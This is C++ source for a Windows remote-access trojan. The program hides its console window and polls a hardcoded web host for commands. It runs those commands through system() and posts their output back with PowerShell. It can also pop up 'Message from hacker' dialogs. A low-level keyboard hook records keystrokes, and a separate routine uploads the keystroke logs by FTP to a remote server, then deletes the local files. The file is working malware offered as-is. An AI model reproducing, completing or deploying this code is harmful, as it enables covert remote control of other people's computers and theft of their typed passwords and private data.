#include<fstream>
#include <iostream>
#include <Windows.h>
#include<winuser.h>
#include <fstream>
#include <wininet.h>
#pragma comment( lib, "wininet" )
#include <ctime>
#include <chrono>
#include <thread>
#include <array>
#include <string>
#include <filesystem>
using namespace std::filesystem;
using namespace std;
string out = "";
string apppath = "C:\\Program Files\\PTinside\\";
HHOOK eHook = NULL;
string exec(const char* cmd,bool logging=false) {
	string fullcmd = (string)cmd +">\""+apppath+"lastCommand.txt\"";
	system(&fullcmd[0]);
	ifstream logfile;
	logfile.open(apppath + "lastCommand.txt");
	string result="",temp;
	while (getline(logfile, temp)) {
		if (logging) {
			string backcmd = "powershell Invoke-WebRequest -Uri https://piotr-trybisz.000webhostapp.com/!vlo/remote/stdout_append.php -Method POST -ContentType 'application/x-www-form-urlencoded' -Body @{'output'='" + temp + "'}";
			system(&backcmd[0]);
		}
		else
			result += temp;
	}
	logfile.close();
	return result;
}
void hide() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	if (wParam == WM_KEYDOWN) {
		out += char(p->vkCode);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
void startKeylogger() {
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)keyboardHookProc, GetModuleHandle(NULL), 0);
}
void saveReport() {
	while (1) {
		this_thread::sleep_for(15s);
		if (out != "") {
			cout << "Saving report file: " + apppath + "reports\\" + to_string(time(0)) + ".html" << endl;
			ofstream reportfile;
			reportfile.open(apppath + "reports\\" + to_string(time(0)) + ".html");
			reportfile << out;
			reportfile.close();
			out = "";
			cout << "Saved!" << endl;
		}
	}
}
void sendReport() {
	ifstream configfile;
	configfile.open(apppath + "config.txt");
	string host, user, pass;
	getline(configfile, host);
	getline(configfile, user);
	getline(configfile, pass);
	configfile.close();
	wstring whost = wstring(host.begin(), host.end());
	wstring wuser = wstring(user.begin(), user.end());
	wstring wpass = wstring(pass.begin(), pass.end());
	while (1) {
		this_thread::sleep_for(35s);
		cout << "Sending report..." << endl;
		string path = apppath + "reports";
		for (const auto& entry : directory_iterator(path)) {
			cout << entry.path() << endl;
			HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
			HINTERNET hFtpSession = InternetConnect(hInternet, whost.c_str(), INTERNET_DEFAULT_FTP_PORT, wuser.c_str(), wpass.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
			string rpath = ("PTlogs/" + entry.path().filename().string());
			wstring wrpath = wstring(rpath.begin(), rpath.end());
			FtpPutFile(hFtpSession, entry.path().c_str(), wrpath.c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
			InternetCloseHandle(hFtpSession);
			InternetCloseHandle(hInternet);
			cout << "File Uploaded: " + ("PTlogs/" + entry.path().filename().string()) << endl;
			string delcmd = "del \"" + entry.path().string() + "\"";
			system(delcmd.c_str());
		}
	}
}
string notification(wstring text) {
		int msgboxID = MessageBox(
			NULL,
			(LPCWSTR)text.c_str(),
			(LPCWSTR)L"Message from hacker",
			MB_ICONWARNING | MB_YESNO | MB_SYSTEMMODAL
		);

		switch (msgboxID)
		{
		case IDYES:
			return "User clicked YES";
		case IDNO:
			return "User clicked NO";
		default:
			return "Window was closed";
		}
}
void remoteExec() {
	while (1) {
		this_thread::sleep_for(10s);
		string command = exec("powershell (New-Object System.Net.WebClient).DownloadString('https://piotr-trybisz.000webhostapp.com/!vlo/remote/stdin.txt')");
		if (command.length() > 1) {
			cout << "Received command: "+command<<endl;
			if (command.find("<MESSAGE>") != -1) {
				string text = command.substr(command.find_first_of(">")+1, command.size());
				wstring wtext = wstring(text.begin(), text.end());
				string backcmd = "powershell Invoke-WebRequest -Uri https://piotr-trybisz.000webhostapp.com/!vlo/remote/stdout_append.php -Method POST -ContentType 'application/x-www-form-urlencoded' -Body @{'output'='" + notification(wtext) + "'}";
				system(&backcmd[0]);
			}
			else
				exec(&command[0],true);
			/*string backcmd = ("powershell Invoke-WebRequest -Uri https://piotr-trybisz.000webhostapp.com/!vlo/remote/stdout_append.php -Method POST -ContentType 'application/x-www-form-urlencoded' -Body @{'output'='"+result+"'}");
			system(&backcmd[0]);*/
			cout << "Clearing pending command..." << endl;
			string clearcmd = ("powershell Invoke-WebRequest -Uri https://piotr-trybisz.000webhostapp.com/!vlo/remote/stdin_clear.php -Method POST");
			system(&clearcmd[0]);
			cout << "Finished command processing." << endl;
		}
	}
}
int main()
{
	hide();//Comment this line for debugging
	MSG Msg;
	cout << "Agent started..." << endl;
	thread commander(remoteExec);
	cout << "Commander started..."<<endl;
	//Please uncomment to use the keylogger module.
	/*startKeylogger();
	cout << "Keylogger started..."<<endl;
	thread dumper(saveReport);
	thread sender(sendReport);*/
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return 0;
}